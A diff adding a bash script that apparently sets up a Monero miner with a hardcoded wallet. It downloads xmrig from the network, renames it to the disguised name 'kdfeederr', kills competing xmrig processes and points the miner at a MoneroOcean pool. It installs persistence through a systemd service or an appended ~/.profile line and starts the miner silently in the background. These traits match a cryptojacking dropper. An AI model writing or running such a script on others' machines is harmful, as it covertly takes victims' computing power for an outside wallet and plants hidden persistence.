@@ -1,0 +1,181 @@
+#!/bin/bash
+# mfeederr.sh — MoneroOcean miner setup (minimal output, hardcoded wallet)
+set -u
+
+WALLET="86d9KS12AnJTAVCbQcsw7G5e18ETxxVgAYyzM5d1yxxtAQXAAeAUoD6Sithghh7ookT3GNnkDX276GCRyNpPn9M4Nv2M44B"
+EMAIL="${1:-}"
+BIN_NAME="kdfeederr"
+DIR="$HOME/moneroocean"
+BIN="$DIR/$BIN_NAME"
+CFG="$DIR/config.json"
+CFGB="$DIR/config_background.json"
+
+fail() { echo "FAILED: $1"; exit 1; }
+
+have() { command -v "$1" >/dev/null 2>&1; }
+
+download() { # url out
+  if have curl; then curl -sL "$1" -o "$2"
+  elif have wget; then wget -q "$1" -O "$2"
+  else return 1; fi
+}
+
+fetch() { # url -> stdout
+  if have curl; then curl -s "$1"
+  elif have wget; then wget -qO- "$1"
+  else return 1; fi
+}
+
+# --- preflight ---
+[ -n "${HOME:-}" ] && [ -d "$HOME" ] || fail "HOME not set"
+have curl || have wget || fail "no curl/wget"
+WBASE="${WALLET%%.*}"
+{ [ "${#WBASE}" = 95 ] || [ "${#WBASE}" = 106 ]; } || fail "bad wallet length ${#WBASE}"
+
+# --- port ---
+CPU_THREADS=$(nproc 2>/dev/null || echo 1)
+EXP=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP" -lt 1 ] && EXP=1
+power2() {
+  if have bc; then echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
+  else local n=$1 p=1; while [ "$p" -lt "$n" ]; do p=$((p*2)); done; echo "$p"; fi
+}
+PORT=$(( EXP * 30 )); [ "$PORT" -eq 0 ] && PORT=1
+PORT=$(( 10000 + $(power2 "$PORT") ))
+{ [ "$PORT" -ge 10001 ] && [ "$PORT" -le 18192 ]; } || fail "port out of range: $PORT"
+
+# --- clean ---
+pkill -f "$BIN_NAME" 2>/dev/null || true
+pkill -f "xmrig" 2>/dev/null || true
+rm -rf "$DIR" || fail "cannot remove $DIR"
+
+# --- download ---
+mkdir -p "$DIR" || fail "cannot create $DIR"
+download "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" /tmp/xmrig.tar.gz \
+  || fail "download xmrig.tar.gz"
+tar xf /tmp/xmrig.tar.gz -C "$DIR" 2>/dev/null || fail "unpack xmrig.tar.gz"
+rm -f /tmp/xmrig.tar.gz
+
+# --- rename ---
+[ -f "$DIR/xmrig" ] || fail "xmrig binary missing after unpack"
+mv "$DIR/xmrig" "$BIN" || fail "rename failed"
+chmod +x "$BIN" || fail "chmod failed"
+
+if ! "$BIN" --help >/dev/null 2>&1; then
+  REL=$(fetch "https://github.com/xmrig/xmrig/releases/latest")
+  URL="https://github.com$(echo "$REL" | grep -o '"[^"]*xenial-x64.tar.gz"' | cut -d'"' -f2)"
+  [ -n "$URL" ] || fail "advanced binary broken, no stock fallback URL"
+  download "$URL" /tmp/xmrig.tar.gz || fail "stock xmrig download failed"
+  tar xf /tmp/xmrig.tar.gz -C "$DIR" --strip=1 2>/dev/null || fail "stock xmrig unpack failed"
+  rm -f /tmp/xmrig.tar.gz
+  [ -f "$DIR/xmrig" ] && mv -f "$DIR/xmrig" "$BIN"
+  "$BIN" --help >/dev/null 2>&1 || fail "stock xmrig also broken"
+fi
+
+# --- worker id ---
+PASS=$(hostname 2>/dev/null | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')
+[ -z "$PASS" ] || [ "$PASS" = "localhost" ] && PASS="kdfeederr"
+[ -n "$EMAIL" ] && PASS="$PASS:$EMAIL"
+
+# --- config ---
+cat > "$CFG" <<EOF
+{
+  "api": { "id": null, "worker-id": null },
+  "background": false,
+  "colors": true,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "huge-pages-jit": false,
+    "hw-aes": null,
+    "priority": 1,
+    "memory-pool": false,
+    "yield": true,
+    "max-threads-hint": 90,
+    "asm": true,
+    "rx": [0,1,2,3],
+    "rx/wow": [0,1,2,3],
+    "rx/arq": [0,1,2,3]
+  },
+  "donate-level": 1,
+  "log-file": "$DIR/xmrig.log",
+  "pools": [
+    {
+      "algo": null,
+      "coin": null,
+      "url": "gulf.moneroocean.stream:$PORT",
+      "user": "$WALLET",
+      "pass": "$PASS",
+      "rig-id": null,
+      "nicehash": false,
+      "keepalive": true,
+      "enabled": true,
+      "tls": false,
+      "tls-fingerprint": null,
+      "daemon": false
+    }
+  ],
+  "print-time": 60,
+  "retries": 5,
+  "retry-pause": 5,
+  "syslog": false,
+  "watch": true
+}
+EOF
+[ -s "$CFG" ] || fail "config write failed"
+
+cp "$CFG" "$CFGB" || fail "background config copy failed"
+sed -i 's/"background": *false/"background": true/' "$CFGB" || fail "background config edit failed"
+
+if have python3; then
+  python3 -m json.tool "$CFG"  >/dev/null 2>&1 || fail "config.json invalid"
+  python3 -m json.tool "$CFGB" >/dev/null 2>&1 || fail "config_background.json invalid"
+fi
+
+# --- miner.sh ---
+cat > "$DIR/miner.sh" <<EOF
+#!/bin/bash
+if ! pidof $BIN_NAME >/dev/null; then
+  nice $BIN "\$@"
+else
+  echo "Miner already running."
+fi
+EOF
+chmod +x "$DIR/miner.sh" || fail "miner.sh chmod failed"
+
+# --- persistence (best effort) ---
+PERSIST=0
+if have sudo && sudo -n true 2>/dev/null && have systemctl; then
+  cat >/tmp/moneroocean_miner.service <<EOF
+[Unit]
+Description=Monero miner service
+[Service]
+ExecStart=$BIN --config=$CFG
+Restart=always
+Nice=10
+CPUWeight=1
+[Install]
+WantedBy=multi-user.target
+EOF
+  if sudo -n mv /tmp/moneroocean_miner.service /etc/systemd/system/ 2>/dev/null \
+     && sudo -n systemctl daemon-reload 2>/dev/null \
+     && sudo -n systemctl enable --now moneroocean_miner.service 2>/dev/null; then
+    PERSIST=1
+  else
+    rm -f /tmp/moneroocean_miner.service
+  fi
+fi
+if [ "$PERSIST" = "0" ]; then
+  LINE="$DIR/miner.sh --config=$CFGB >/dev/null 2>&1"
+  if grep -q "moneroocean/miner.sh" "$HOME/.profile" 2>/dev/null; then
+    PERSIST=1
+  elif echo "$LINE" >> "$HOME/.profile" 2>/dev/null; then
+    PERSIST=1
+  fi
+fi
+
+# --- start now ---
+nohup "$BIN" --config="$CFGB" >/dev/null 2>&1 &
+sleep 2
+pgrep -f "$BIN_NAME" >/dev/null || fail "miner did not stay up (see $DIR/xmrig.log)"
+
+echo "SUCCESS: pid=$(pgrep -f "$BIN_NAME" | tr '\n' ' ') port=$PORT persist=$([ "$PERSIST" = 1 ] && echo yes || echo no)"
